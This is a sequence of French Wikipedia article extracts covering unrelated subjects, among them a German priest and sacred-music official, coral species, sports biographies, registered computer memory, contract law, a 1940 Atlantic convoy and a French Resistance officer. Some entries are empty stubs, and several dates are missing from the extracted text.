Le , fête de sainte Cécile et patronne de la musique sacrée (plus précisément, d'abord celle de l'orgue), le pape Paul VI créa la "Consociatio Internationalis Musicæ Sacræ" afin de promouvoir la musique liturgique selon son décret "Nobile subsidium Liturgiæ". Il était définitif que Johannes Overath ait été nommé premier président. Quand bien même le concile aurait une tendance à diminuer le rôle de la musique sacrée dans la liturgie, Johannes Overath défendait la tradition et le trésor de la musique liturgique de l'Église, malgré cette tendance, en respectant l'intention du pape.
Puis, il fut pareillement nommé consulteur du "Consilium ad Exsequendam Constitutionem" en 1964.
Le concile terminé, il fut invité par les ecclésiastiques américains, de sorte qu'ils puissent connaître correctement ceux que le concile avait modifiés dans la liturgie. Comme la Consociatio Internationalis Musicæ Sacræ était, dorénavant, chargée d'organiser le Congrès international de musique sacrée, il assista en qualité de président, du 21 au , au congrès, tenu à Chicago et à Milwaukee
Notes et références.
[[Catégorie:Clergé allemand du XXe siècle]]
[[Catégorie:Prêtre catholique allemand]]
[[Catégorie:Musicologue allemand]]
[[Catégorie:Grégorianiste]]
[[Catégorie:Naissance en avril 1913]]
[[Catégorie:Naissance à Troisdorf]]
[[Catégorie:Naissance dans la province de Rhénanie]]
[[Catégorie:Décès en mai 2002]]
[[Catégorie:Décès à Cologne]]
[[Catégorie:Décès à 89 ans]]

</doc>
<doc id="9413596" url="https://fr.wikipedia.org/wiki?curid=9413596" title="Hétérocongre tacheté">
Hétérocongre tacheté



</doc>
<doc id="9413597" url="https://fr.wikipedia.org/wiki?curid=9413597" title="Anguille-jardinière mouchetée">
Anguille-jardinière mouchetée



</doc>
<doc id="9413598" url="https://fr.wikipedia.org/wiki?curid=9413598" title="Caryophyllia valdiviae">
Caryophyllia valdiviae

Caryophyllia valdiviae est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413600" url="https://fr.wikipedia.org/wiki?curid=9413600" title="Anton Tinnerholm">
Anton Tinnerholm

Anton Tinnerholm né le à Linköping, est un footballeur international suédois jouant au poste d'arrière droit au Malmö FF.
Biographie.
Le , Tinnerholm quitte le New York City FC et retourne au Malmö FF en Suède où il s'engage jusqu'en 2026. En cinq saisons avec la franchise de Major League Soccer, il cumule plus de cent-trente rencontres et participe au premier succès de l'histoire du club : la conquête de la Coupe MLS en 2021.
Statistiques.
Le tableau ci-dessous récapitule les statistiques d'Anton Tinnerholm lors de sa carrière en club :

</doc>
<doc id="9413605" url="https://fr.wikipedia.org/wiki?curid=9413605" title="Standish">
Standish

Standish peut désigner :

</doc>
<doc id="9413607" url="https://fr.wikipedia.org/wiki?curid=9413607" title="Caryophyllia zopyros">
Caryophyllia zopyros

Caryophyllia zopyros est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413608" url="https://fr.wikipedia.org/wiki?curid=9413608" title="Mémoire vive à registres">
Mémoire vive à registres

Une mémoire vive à registres (ou mémoire vive à tampons ; en anglais, registered memory ou buffered memory) est un type de mémoire vive qui possède des registres mémoires entre les modules DRAM et le contrôleur mémoire.
En français, le terme anglais "registered memory" est tout aussi connu (voire plus) que le terme "mémoire vive à registres".
Les registres permettent de réduire la charge électrique sur le contrôleur mémoire et permettent à un ordinateur d'être plus stable en cas d'ajout de mémoire vive. La mémoire vive conventionnelle (sans registres), lorsque comparée à la mémoire vive à registres, est souvent appelée unbuffered memory ou unregistred memory.
Lorsque le module mémoire comprend deux rangées de contact distinctes ("Dual Inline Memory Module - DIMM"), une mémoire vive à registres est appelée RDIMM alors que celle sans registre est appelée UDIMM.
Utilisation.
Étant donné qu'elle est vendue en moindre quantité et qu'elle nécessite plus de composants, la mémoire vive à registres est souvent plus chère. Par conséquent elle est habituellement utilisée uniquement pour des applications où le besoin d'extensibilité ("scalability") et de robustesse l'emporte sur le prix - par exemple, dans les serveurs.
Mémoire avec correction d'erreurs ("ECC memory").
Bien que la plupart des modules de mémoire vive à registres comportent un système de correction d'erreurs ("Error-Correcting Code Memory ou ECC Memory"), ce n'est pas toujours le cas. De la même façon, les modules avec correction d'erreurs intégrée ne sont pas toujours pourvus de registres. Les modules de mémoire sans registres avec correction d'erreurs sont, par exemple, utilisés dans les stations de travail ou dans les cartes mères d'entrée de gamme de serveurs qui n'acceptent pas beaucoup de mémoire vive.
Performance.
Habituellement, l'utilisation de la mémoire vive à registres entraine une réduction de la performance. Chaque lecture ou écriture transite dans le registre durant un cycle d'horloge entre le bus de la mémoire et de la mémoire DRAM, de sorte qu'on peut considérer que la mémoire vive à registres a un cycle d'horloge de retard comparativement à la mémoire DRAM sans registres. Avec la mémoire SDRAM, le retard s'applique qu'au premier cycle d'une rafale.
Compatibilité.
Habituellement, la carte mère doit correspondre au type de mémoire ; en conséquence, une mémoire vive à registres ne fonctionnera pas sur une carte mère qui n'est pas conçue pour ce type de mémoire, et inversement. Certaines cartes mères de PC acceptent des modules de mémoire avec registres ou des modules de mémoire sans registres, mais les deux types de modules ne peuvent pas y coexister.
Types de mémoire à registres.
Les modules DIMM à registres (tamponnés) (R-DIMM) insèrent une mémoire tampon entre les broches des bus de commande et d’adresse sur le DIMM et les puces mémoire. Un module DIMM haute capacité peut être doté de nombreuses puces mémoire, chacune d’entre elles devant recevoir l’adresse mémoire, et leur capacité d’entrée combinée limite la vitesse à laquelle le bus de mémoire peut fonctionner. En redistribuant les signaux de commande et d’adresse au sein du R-DIMM, cela permet à davantage de puces d’être connectées au bus mémoire. Le coût est une accrue, à la suite du cycle d’horloge supplémentaire requis pour que l’adresse traverse la mémoire tampon supplémentaire. Les premiers modules de RAM enregistrés étaient physiquement incompatibles avec les modules de RAM non enregistrés, mais les deux variantes de SDRAM R-DIMM sont mécaniquement interchangeables, et certaines cartes mères peuvent prendre en charge les deux types.
Les modules Load Reduced DIMM (LR-DIMM ou LRDIMM) sont similaires aux R-DIMM, mais ajoutent également une mémoire tampon aux lignes de données. En d’autres termes, les LR-DIMM mettent en mémoire tampon à la fois les lignes de contrôle et de données tout en conservant la nature parallèle de tous les signaux. En conséquence, les LR-DIMM offrent de grandes capacités de mémoire maximales globales, tout en évitant les problèmes de performances et de consommation d’énergie des FB-DIMM, induits par la conversion requise entre les formes de signal série et parallèle.
Les modules DIMM entièrement mis en mémoire tampon (FB-DIMM) augmentent encore plus les capacités de mémoire maximales dans les grands systèmes, en utilisant une puce tampon plus complexe pour effectuer la traduction entre le bus large des puces SDRAM standard et un bus de mémoire série étroit et haute vitesse. En d’autres termes, tous les transferts de contrôle, d’adresse et de données vers les FB-DIMM sont effectués en série, tandis que la logique supplémentaire présente sur chaque FB-DIMM transforme les entrées série en signaux parallèles nécessaires au pilotage des puces mémoire. En réduisant le nombre de broches requises par bus mémoire, les processeurs pourraient prendre en charge plus de bus mémoire, ce qui permettrait une bande passante et une capacité mémoire totales plus élevées. Malheureusement, la traduction augmentait encore la latence de la mémoire, et les puces tampons complexes à grande vitesse utilisaient beaucoup d’énergie et généraient beaucoup de chaleur.
Les FB-DIMM et LR-DIMM sont conçus principalement pour minimiser la charge qu’un module de mémoire présente sur le bus mémoire. Ils ne sont pas compatibles avec les R-DIMM, et les cartes mères qui en ont besoin n’acceptent généralement aucun autre type de module de mémoire.

</doc>
<doc id="9413609" url="https://fr.wikipedia.org/wiki?curid=9413609" title="Russell Tucker">
Russell Tucker

Russell Tucker (né le à Barberton) est un athlète sud-africain, spécialiste du lancer de disque.
Biographie.
En 2015 il est vainqueur de l'épreuve du lancer de disque à l'occasion des Jeux africains qui se déroulent à Brazzaville avec près de huit mètres d'avance sur le deuxième. 
En 2016, il devient champion d'Afrique (61,44 m), après le déclassement de son compatriote Victor Hogan (61,68 m) pour dopage.

</doc>
<doc id="9413613" url="https://fr.wikipedia.org/wiki?curid=9413613" title="4 regrets et un enterrement">
4 regrets et un enterrement



</doc>
<doc id="9413617" url="https://fr.wikipedia.org/wiki?curid=9413617" title="Lumbrales">
Lumbrales

Lumbrales est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9413618" url="https://fr.wikipedia.org/wiki?curid=9413618" title="Peter Jenni">
Peter Jenni

Peter Jenni (né le ) est un physicien des particules suisse qui travaille au CERN. Il est connu pour être un des « pères fondateurs » de l'expérience ATLAS au grand collisionneur de hadrons du CERN.
Biographie.
Peter Jenni, né en 1948, est Suisse. Il obtient son diplôme de physique à l'université de Berne en 1973 et son doctorat à l'École polytechnique fédérale de Zurich (ETHZ) en 1976.

</doc>
<doc id="9413621" url="https://fr.wikipedia.org/wiki?curid=9413621" title="Rossiya Segodnya">
Rossiya Segodnya



</doc>
<doc id="9413625" url="https://fr.wikipedia.org/wiki?curid=9413625" title="Standish (Maine)">
Standish (Maine)

Standish est une ville des États-Unis située dans le comté de Cumberland. Fondée en 1750, elle compte au recensement de 2010.

</doc>
<doc id="9413627" url="https://fr.wikipedia.org/wiki?curid=9413627" title="Chambre de Hongrie">
Chambre de Hongrie

La Chambre de Hongrie ou Chambre royale hongroise ("Udvari Kamara" ou "Magyar Királyi Kamara" en hongrois ; "Ungarischen Hofkammer" en allemand ; "Camera Aulica" ou " Camerae Ungaricae " en latin) est l'institution suprême pour les finances et l'économie du royaume de Hongrie, opérant de fait sous le contrôle des autorités centrales de Vienne (Hofkammer). Basée à Pozsony, en actuelle Slovaquie, puis à Buda, la Chambre de Hongrie exista de 1526 à 1848. 
Histoire.
La Chambre royale hongroise est créée par Ferdinand Ier (1526-1564) en 1527. Son siège se situe à Pozsony, capitale du royaume hongrois de 1536 à 1848, jusqu'en 1784, année où Joseph II la fait transférer à Buda. Elle sera ensuite associée au Conseil de Lieutenance royal hongrois ("Magyar Királyi Helytartótanácsot"). Restructurée par Marie-Thérèse et Joseph II, elle devient "Chambre générale" ("allgemeine Hofkammer") de 1816 à 1848, gérée par un ministre des Finances. Elle fait place au ministère des Finances.
La Chambre de Szepes est son équivalent pour la partie orientale du royaume. Les finances de la Transylvanie sont gérées par l'Administration du Trésor ("Kincstartóság" ; "Thesaurariatus"), intégrée au par Joseph II.

</doc>
<doc id="9413631" url="https://fr.wikipedia.org/wiki?curid=9413631" title="Machacón">
Machacón

Machacón est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9413633" url="https://fr.wikipedia.org/wiki?curid=9413633" title="Combat de Dely Ibrahim">
Combat de Dely Ibrahim



</doc>
<doc id="9413640" url="https://fr.wikipedia.org/wiki?curid=9413640" title="Benoît Piffero">
Benoît Piffero

Benoît Piffero, né le à Montréal (Canada), est un joueur international canadien d'origine française de rugby à XV qui évolue au poste de talonneur.
Biographie.
Jeunesse et formation.
Benoît Piffero naît à Montréal, au Canada, de parents français originaire de Midi-Pyrénées. Il vit dans ce pays jusqu'à ses trois ans avant d'aller vivre en France, tout d'abord à Aix-les-Bains, puis à La Motte-Servolex, et dans la ville d'Issoire l'année de ses sept ans. C'est dans cette ville qu'il est tout d'abord formé au rugby à XV au sein de l'US Issoire. Il reste dans ce club jusqu'à sa première année Cadets. Lors de cette dernière, il fait notamment partie de la section Sport-étude du lycée Murat d'Issoire.
Par la suite, il intègre les sélections départementales et régionales puis rejoint l'ASM Clermont, et son centre de formation lors de sa dernière année, où il reste quatre ans. À cause de la concurrence à son poste, il décide de rejoindre le centre de formation du Montpellier HR où il reste durant quatre années également. Il intègre l'IUT de GEA de Montpellier, c'est là-bas qu'il rencontre notamment sa future femme Clara.
Il débute le rugby au poste de demi de mêlée avant de basculer en troisième ligne aile, au centre et même en demi d'ouverture, toutefois, dans l'optique de son arrivée au sein du centre de formation de l'ASM Clermont, il demande à devenir talonneur, son poste final.
En vertu de sa nationalité canadienne, il tente une approche avec la fédération canadienne de rugby à XV pour essayer d'intégrer la sélection canadienne à l'âge de dix-neuf ans. Toutefois, le système de sélection canadien, demande au joueur de payer financièrement sa sélection, de ce fait, n'ayant pas les moyens ni l'anglais nécessaire, ses démarches s'interrompent.
Carrière sportive.
Finalement, il signe en Fédérale 1 dans le but de faire ses débuts en senior, il rejoint alors l'US Romans Péage en 2010.
Cependant, en 2012, il est sollicité par le directeur du club de Rugby de Burnaby Lake, Simon Smoldon, à la suite d'un CV laissé sur internet, et par l'ancien deuxième ligne canadien du Stade Français, Mike James et Piffero accepte de rejoindre le Canada. Là-bas, il rejoint tout d'abord le Québec et le club de Saine-Anne-de-Bellevue à Montréal. Il est alors sélectionné par les Atlantic Rock, une sélection provinciale participant au Championnat provincial du Canada. Il rejoint également le Canada pour ses études, il est notamment titulaire d'un master 2 dans la vente. Puis en octobre, il rejoint la Colombie-Britannique et donc le club de Burnaby où la plupart des joueurs internationaux canadiens jouent dans ce dernier. Il effectue alors un stage avec les "Canucks" en .
Par la suite, il fait son retour en France au sein du Blagnac SCR à partir de la saison 2013-2014 de Fédérale 1. Finalement, il est sélectionné peu de temps après avec l'équipe du Canada pour les tests d'automne à la suite d'une blessure dans le groupe canadien. Il dispute ses trois premières rencontres internationales face à la Géorgie, la Roumanie (où il est titulaire) et le Portugal.
Durant l'été 2014, il est appelé pour la Pacific Nations Cup. Quelques mois plus tard, il se blesse au niveau du ligament postérieur, le mettant dans une position délicate car la Coupe du monde approche. Mais, en , il est sélectionné par l'équipe du Canada A (l'équipe réserve) pour disputer le Pacific Challenge où il réalise des prestations convaincantes.
À l'été 2015, il fait finalement partie du groupe des sélectionnés dans l’équipe du Canada pour disputer la Coupe du monde. Il dispute une rencontre, en tant que remplaçant, face à l'Irlande (défaite 50 à 7) durant la compétition. Toujours en 2015, il rejoint le club de l'Avenir castanéen rugby durant une saison avant de retourner à Blagnac où il est entraîné par Christophe Deylaud.
Par la suite, il est régulièrement sélectionné avec le Canada, notamment pour la Coupe du monde 2019. Il prend alors part à ses deux dernières rencontres internationales durant la compétition face à l'Italie et les futurs champions du monde, l'Afrique du Sud, pour deux défaites. Il prend sa retraite internationale après la compétition.
En , il dispute le dernier match de sa carrière, Blagnac étant alors en Nationale désormais, contre Tarbes. Par la suite, il devient dirigeant au sein du club.
Vie privée.
Son cousin est le joueur professionnel de rugby à XV Clément Castets. Son frère, Nicolas joue également au rugby.
À côté de sa vie rugbystique, il est responsable commercial dans une agence de travail temporaire à Colomiers.
Palmarès.
"Néant"
Statistiques en équipe nationale.
Benoît Piffero compte 26 capes en équipe du Canada, dont sept en tant que titulaire. Il a obtenu sa première cape internationale le face à l'équipe de Géorgie à Tbilissi. Puis, son dernier match international a eu lieu le contre l'Afrique du Sud à Kobe.

</doc>
<doc id="9413642" url="https://fr.wikipedia.org/wiki?curid=9413642" title="Contrat réel">
Contrat réel

Un contrat réel est un contrat parfait non par l'échange de consentement mais par la remise d'une chose.
Droit français.
En droit français, le contrat de prêt, contrat de dépôt, le gage (avant l'entrée en vigueur de l'ordonnance du ) sont des contrats réels.
Droit québécois.
La doctrine civiliste québécoise distingue entre le contrat réel, le contrat consensuel et le contrat solennel. Quant au contrat réel, les auteurs Langevin et Vézina donnent l'exemple du contrat de prêt à usage (art. 2313 C.c.Q.). Il existe aussi le contrat de dépôt (art. 2280 C.c.Q.) et le prêt simple (art. 2314 C.c.Q.).
Droit romain.
En droit romain, les contrats peuvent divisés entre les "re" c'est-à-dire liés par le remise de la chose ("res"), les consensuels, et les contrats innommés. Bien que Gaius identifie uniquement un seul type de contrat "re", selon Justinien il y en a quatre, le mutuum (prêt à la consommation), le commodat (prêt à l'emploi), le depositum (dépôt) et le pignus (gage).

</doc>
<doc id="9413645" url="https://fr.wikipedia.org/wiki?curid=9413645" title="Alright!">
Alright!



</doc>
<doc id="9413647" url="https://fr.wikipedia.org/wiki?curid=9413647" title="Contrat innommé">
Contrat innommé

Droit français.
En droit français, un contrat innommé est un contrat qui n'est pas décrit par le code civil — contrairement au contrat nommé, qui lui, trouve son régime juridique fixé et organisé par ce même code civil. Le contrat innommé est donc une convention inconnue des classifications légales. Comme le contrat nommé, le contrat innommé est présenté à l'article 1105 du Code civil (anciennement article 1107 avant la réforme du droit des contrats par l'ordonnance n• 2016-131 du ).
Droit québécois.
En droit québécois, la notion de contrat innommé est la même qu'en droit français, mais les contrats innommés qu'on retrouve dans la jurisprudence québécoise ne sont pas les mêmes que les contrats innommés en France. Un professeur de droit a tenté de dresser une liste non exhaustive des contrats innommés qui sont reconnus par la jurisprudence québécoise plutôt que par le Code civil.

</doc>
<doc id="9413660" url="https://fr.wikipedia.org/wiki?curid=9413660" title="Caryophyllia cintinculata">
Caryophyllia cintinculata

Caryophyllia cintinculata est une espèce de coraux appartenant à la famille des Caryophylliidae. Selon la base de données World Register of Marine Species, Caryophyllia cintinculata est synonyme de Thecocyathus cinticulatus .

</doc>
<doc id="9413664" url="https://fr.wikipedia.org/wiki?curid=9413664" title="Convoi HX 22">
Convoi HX 22

Le convoi HX 22 est un convoi passant dans l'Atlantique nord, pendant la Seconde Guerre mondiale. Il part de Halifax au Canada le 22 février 1940 pour différents ports du Royaume-Uni et de la France. Il arrive à Liverpool le 9 mars 1940.
Composition du convoi.
Ce convoi est constitué de 35 cargos :
L'escorte.
Ce convoi est escorté en début de parcours par :
Le voyage.
Le cuirassé quitte l'escorte le jour du départ suivi par les destroyers canadiens le lendemain (23 février). Le convoi traverse sans escorte jusqu'à l'arrivée des destroyers , , et le 6 mars.
Le 8 mars, le cargo britannique "Counsellor" est touché par une mine posée le 6 janvier par le sous marin allemand U-30. La totalité des membres d'équipage (78 personnes) sont recueillis par le HMS "Walpole". Malgré une tentative de remorquage, le navire coule le 9 mars ().

</doc>
<doc id="9413666" url="https://fr.wikipedia.org/wiki?curid=9413666" title="1904 en santé et médecine">
1904 en santé et médecine

Cet article présente les faits marquants de l'année 1904 en santé et médecine.

</doc>
<doc id="9413668" url="https://fr.wikipedia.org/wiki?curid=9413668" title="Beauvais-Tillé">
Beauvais-Tillé



</doc>
<doc id="9413670" url="https://fr.wikipedia.org/wiki?curid=9413670" title="Protéine extrinsèque">
Protéine extrinsèque



</doc>
<doc id="9413672" url="https://fr.wikipedia.org/wiki?curid=9413672" title="Jambon d’York">
Jambon d’York



</doc>

<doc id="9622650" url="https://fr.wikipedia.org/wiki?curid=9622650" title="Albert de Seguin de Reyniès">
Albert de Seguin de Reyniès

Albert Ferdinand Marie Jean de Seguin de Reyniès, né le à Arry en Lorraine annexée et probablement mort à Grenoble le , est un militaire et résistant, lieutenant-colonel commandant le de chasseurs alpins. Il a été nommé chevalier de la Légion d’honneur, décoré de la Croix de guerre 1939-1945 et de la Rosette de la Résistance (à titre posthume). Son corps n’ayant jamais été retrouvé, une plaque lui est consacrée à la nécropole de Saint-Nizier-du-Moucherotte dans le Vercors (Isère) ainsi qu'à l'Hôtel des troupes de montagne, place de Verdun à Grenoble.
Enfance et engagement militaire.
Albert nait en 1900 au Château d'Arry dans une des familles subsistantes de la noblesse française. Son père, Antoine de Reyniès, est lieutenant au BCA (Bataillon de Chasseurs alpins) en garnison à Nice. La vie familiale des Reyniès évolue au gré de la carrière militaire du père. Albert et sa sœur passent donc les premières années de leur vie à Nice, la famille s'installe ensuite à Embrun puis à Grenoble à l’été 1907. Antoine de Reyniès part au Maroc en 1912, Marguerite reste seule avec ses deux enfants pendant huit ans. Il revient du Maroc avec le BCA, pour être engagés sur le front de la Grande Guerre. Alors que la guerre fait rage depuis moins de deux mois, Albert entre à l’internat jésuite Notre-Dame-de-Mongré à Villefranche-sur-Saône. 
La carrière militaire lui apparaît comme une évidence, comme pour ceux qui l'entourent. Il s'y prépare dès l'année scolaire 1916-1917, lorsqu'il passe la première partie du baccalauréat. Il intègre l'école Sainte-Geneviève à Versailles en 1917, réputée pour sa classe préparatoire au concours d'entrée à l'École spéciale militaire de Saint-Cyr. Lorsqu'il passe le concours en mars 1918, il est admis sur 179 et devient militaire en pleine guerre. Pendant la guerre la formation des officiers est adaptée aux circonstances : les lauréats du concours d’entrée à Saint-Cyr doivent s’engager « pour la durée de la guerre » au 169 régiment d’infanterie, dont le dépôt se trouve à Montargis. Albert est donc considéré comme un engagé volontaire puisqu’il arrive au régiment le 12 mai 1918 alors que sa classe est recensée en août et ne sera réellement incorporée qu’en 1920. Il part pour Saint-Cyr pour cinq mois d’instruction accélérée à l’issue de laquelle il est caporal. À sa sortie de stage, il rejoint le 14e bataillon de chasseurs à pied. Sergent depuis mai 1919, Albert reste quelques mois en Rhénanie avec les troupes envoyées en occupation pour garantir l’obéissance de l’Allemagne après l’armistice. 
En novembre 1919, le sergent de Reyniès quitte le bataillon pour recevoir un complément de formation à Saint-Cyr. Mais ce n’est qu’en mars 1920 que commencent les cours de la promotion 1918-1920 dite « de la Victoire ». Il sort second d’une promotion de 166 et, en septembre 1920, devient sous-lieutenant au 5e bataillon de chasseurs à pied. Dès le début de 1921, affecté au BCA, il part en Haute-Silésie. Il retourne au bataillon de chasseurs à Trèves (Allemagne). 
En 1923, il part au Maroc avec le 66e régiment de tirailleurs marocains où les troupes françaises sont chargées d’assurer la stabilité du pays dans le cadre du protectorat liant le souverain Moulay Youssef à la France. Il revient du Maroc titulaire d’une citation et décoré de la croix de guerre des théâtres d’opérations extérieures avec étoile de bronze et de la médaille coloniale avec agrafe « Maroc ». 
Après son mariage avec Henriette de Parisot de Durand de la Boisse en 1925, le couple s’installe à Annecy. Deux mois après, Albert par en renfort au Maroc avec le BCA. Le lieutenant de Reyniès rentre en France début novembre. Les quatre années suivantes sont rythmées par les naissances de trois enfants. 
Albert de Seguin de Reyniès intègre l’École de guerre le 2 novembre 1929 et réalise des stages au sein des différentes composantes de l’Armée de terre. Il passe ensuite un brevet d’observateur aérien. Après le stage suivent deux ans de formation à l’École militaire à Paris. À la même époque, la famille s’agrandit avec l’arrivée d’un quatrième enfant. En rappel de son second séjour marocain, le 20 janvier 1930, il reçoit la médaille de la Paix du Maroc, accordée par l’Espagne à ceux qui ont participé à la guerre du Rif entre 1925 et 1927.
À la sortie de l’École de guerre, de Reyniès est un officier « breveté », ce qui lui permet d’atteindre des postes de haut niveau. Il commence par un stage de service à l’état-major du général Dosse, gouverneur militaire de Lyon et commandant de la région militaire. Durant deux ans il œuvre au sein du bureau de la mobilisation, service de la réquisition hippomobile. Henriette met au monde leur cinquième enfant et de Reyniès est promu au grade de capitaine. À la fin de l’année 1934, les brillants états de services et les actions de guerre du capitaine sont récompensés par une nomination à titre exceptionnel au grade de chevalier de la Légion d’honneur. L’année 1934 est aussi marquée par la naissance de leur sixième enfant. En 1936, la famille retourne à Annecy où, durant deux ans, Albert dirige la compagnie du BCA. Dans sa compagnie sert un jeune saint-cyrien, Théodose Morel, le futur Tom Morel du maquis des Glières. Le septième enfant du couple nait en 1937.
En 1938, alors que l’Allemagne nazie menace de plus en plus l’Europe, notamment avec l’annexion de l’Autriche et de la Pologne, le capitaine retourne à l’état-major de la région et du gouvernement militaire.
La Seconde Guerre mondiale.
De 1939 à 1942.
À la suite de la déclaration de guerre du 3 septembre 1939, de Reyniès est affecté à l’état-major de la , au bureau. Chargé des opérations, il a pour mission de décliner les manœuvres voulues par le commandement en ordres exécutables par les unités. Moins de deux mois plus tard, il rejoint le général Besson auquel a été confié le groupe d’armée qui défend la frontière avec l’Allemagne, de Colmar au Jura. C’est au sein de ce groupe que de Reyniès passe la période de la « drôle de guerre ». Le général Besson cite le capitaine à l’ordre du corps d’armée le 27 juin 1940 avec le motif suivant « […] "Au cours de la bataille de France, du 20 mai au 24 juin 1940, a effectué de nombreuses missions auprès des unités en ligne, rapportant toujours les renseignements les plus complets. S’est distingué notamment pendant les combats sur l’Ourcq et la Marne, faisant preuve d’un beau sang-froid sous les bombardements aériens." » Cette citation lui donne droit au port de la croix de guerre. 
L’armistice est signé le 22 juin 1940. De Reyniès est promu au grade de chef de bataillon et est muté auprès du général commandant de la région militaire. Cette région, créée le 25 juin 1940, fait partie des nouvelles régions militaires des zones non occupées par l’armée allemande. Dès le 19 septembre, Albert doit se rendre à Vichy pour prendre de nouvelles consignes. Entre-temps, il a exercé les fonctions de chef du bureau, quittant le domaine des opérations pour celui des renseignements.
Albert est placé auprès du chef d’état-major de la commission de "Wiesbaden", qui doit régler l’application de l’armistice entre la France et l’Allemagne, avec la faculté de le remplacer si nécessaire. Reyniès, dont le nom est simplifié en « chef de bataillon Seguin », fait partie de la sous-commission Heer (armée de terre). Pendant un an et demi, Seguin subit l’arrogance de l’ennemi, qui ne manque pas d’affirmer sa supériorité sur les représentants français.
De 1942 à 1944.
En 1942, il prend le commandement du 6e bataillon de chasseurs alpins dans l’armée d’armistice, à Grenoble. L’armée d’armistice est déconsidérée à la suite de la défaite et sous-équipée, le nouveau chef de bataillon met alors l’accent sur l’instruction et la formation morale de ses cadres, sans négliger l’aguerrissement physique, pour faire des chasseurs de vrais montagnards. Dans le même temps, il poursuit le travail de son prédécesseur, le commandant Segonne : soustraire le plus possible de matériel des comptabilités allemandes afin de constituer les stocks nécessaires à la reprise future du combat. Dès l’été 1940 se met en place la « conservation » puis le « camouflage » du matériel (CDM) : caches d’armes ou maquillage de véhicules militaires, tous les moyens sont bons pour mettre de côté l’équipement de l’armée de la revanche. 
S’il s’acharne à préparer son bataillon à reprendre le combat contre les Allemands, les positions personnelles d’Albert concernant l’ensemble du régime de Vichy et la relation au maréchal Pétain ne sont pas connues. Il fait partie de ces générations d’officiers qui considèrent ne pas avoir à intervenir dans le domaine politique ; les militaires n’ont d’ailleurs pas le droit de vote, et ils ne l’obtiendront qu’après les femmes. Tant que la France a une armée, il s’emploie à son niveau à ce qu’elle soit la plus efficace possible, mais sans être dupe de l’impasse dans laquelle s’est engagé le nouveau régime en traitant avec l’Allemagne.
Le 8 novembre 1942, les forces anglo-américaines débarquent en Afrique du Nord, alors sous la souveraineté de l’État français. L’arrivée des troupes étrangères est considérée comme une invasion. Hitler considère que le traité d’armistice est rompu et envahit la zone sud le 11 novembre 1942. En Isère, le général André Laffargue a préparé de longue date des plans pour le cas où la ligne de démarcation serait violée par les Allemands. La défense du verrou de Voreppe revient au BCA. À peine l’ordre de prendre les positions de résistance est esquissé que le général Laffargue doit annuler : officiellement, les troupes ne font que passer pour aider à la sécurisation des rives de la Méditerranée, en accord avec le gouvernement français. Le 27 novembre, les garnisons de Lyon et de Vienne sont désarmées par les troupes allemandes. Le général Laffargue fait valoir aux chefs de corps que cette action constitue une violation de l’armistice, que la France et l’Allemagne sont donc de nouveau en guerre et que se laisser désarmer équivaudrait à capituler : il propose l’Oisans comme lieu de retraite où les troupes pourraient résister. De Reyniès emmène aussitôt son bataillon prendre la position qui lui est assignée à Brié-et-Angonnes, sur la route de Grenoble à Vizille. Un bras de fer s’engage entre Vichy et Laffargue : ses supérieurs lui enjoignent de faire rentrer les troupes, ce qu’il refuse. Puis, par ordre du gouvernement, les unités sont dissoutes. Le général Laffargue se résout à céder.
Le BCA se disperse dans une prairie de Brié-et-Angonnes. Décidé à ne pas laisser disparaître le bataillon sur un échec, de Reyniès incite les officiers, sous-officiers et chasseurs à rester en contact. Pour certains, cet instant est un pivot qui détermine leur entrée future dans la Résistance. Toujours actif, le commandant de Reyniès prend des mesures concrètes. En accord avec le général Laffargue, il cache, grâce au CDM, le plus de matériel possible, ne livrant que le minimum au dépôt officiel. Les stocks alors constitués serviront directement à armer le maquis. 
L’armée d’armistice n’existe plus, une seule voie subsiste pour délivrer le sol national : la clandestinité. Dans un premier temps, Albert cherche à maintenir la cohésion de son bataillon. En parallèle, il occupe un emploi à Saint-Laurent-du-Pont dans l’administration des Eaux et forêts. En mars 1943, il reçoit une affectation au centre démobilisateur de Pont-de-Claix. L’activité souterraine de de Reyniès prend de l’ampleur : le général Laffargue, poussé par le commandant Marcel Descour, chef de l’ORA (Organisation de résistance de l’armée) pour la région de Lyon, lui confie la tête de l’organisation au sein du département. Il accepte avec gravité, mais sans enthousiasme : ce poste l’éloignera du bataillon qu’il veut constituer et le conduira à multiplier les déplacements et les contacts. Les routes de l’abbé Pierre et du commandant de Reyniès, se rejoignent alors autour de la question des jeunes réfractaires au STO (Service du travail obligatoire) et du « maquis Palace ». 
L’action de de Reyniès, « Renaud », qui prendra ensuite le pseudonyme de « Roland », est rendue possible par les subsides de l’ORA. À la fin de l’année 1943, l’ORA et l’AS (Armée secrète) fusionnent à la suite de la « Saint-Barthélemy grenobloise ». Le chef départemental de l’AS, Albert Reynier, « Vauban », en a réchappé, mais est toujours menacé et cherche un successeur. En décembre 1943, Roland accepte d’endosser cette nouvelle responsabilité : ORA et AS fusionnent de fait. Vauban confie à son prédécesseur le secteur Grésivaudan-Belledonne. 
Le Vercors.
Le Vercors occupe une place à part entière au sein des différents maquis (Belledonne, Oisans, Chartreuse). Des huit secteurs organisant le territoire, il est le seul à relever directement de l’état-major national, car le « Plan Montagnards » en fait une sorte de base avancée d’où les troupes allemandes pourront être prises à revers le jour où le débarquement aura lieu en Provence. Une exception cependant : dans le hameau de Malleval, jusqu’à une centaine d’hommes relèvent de Roland. Le groupe devait être la base de la future renaissance du BCA. Roland s’est entouré d’un chef d’état-major, le capitaine Lecoanet dit « Lecompte » et d’un adjoint « opérations », le capitaine de l’armée de l’air Hirschauer. Pour mener à bien ce projet, de Reyniès juge nécessaire de rester à Grenoble malgré le danger. Le général Laffargue quitte l’hôtel de la division début 1944 et encourage Reyniès à en faire autant. Il refuse de s’éloigner, mais décide de mettre sa famille à l’abri à l’Étoile, à une dizaine de kilomètres au sud de Valence. Tenant finalement compte des nombreuses atteintes portées aux résistants il s’installe à Seyssins, entre Grenoble et le Vercors. 
Le 25 janvier 1944 à Méaudre, Roland participe à la réunion dite Monaco où il représente l’Armée secrète. Un nouveau Comité départemental de libération nationale (CDLN) est créé et ses modes de fonctionnement sont alors définis.
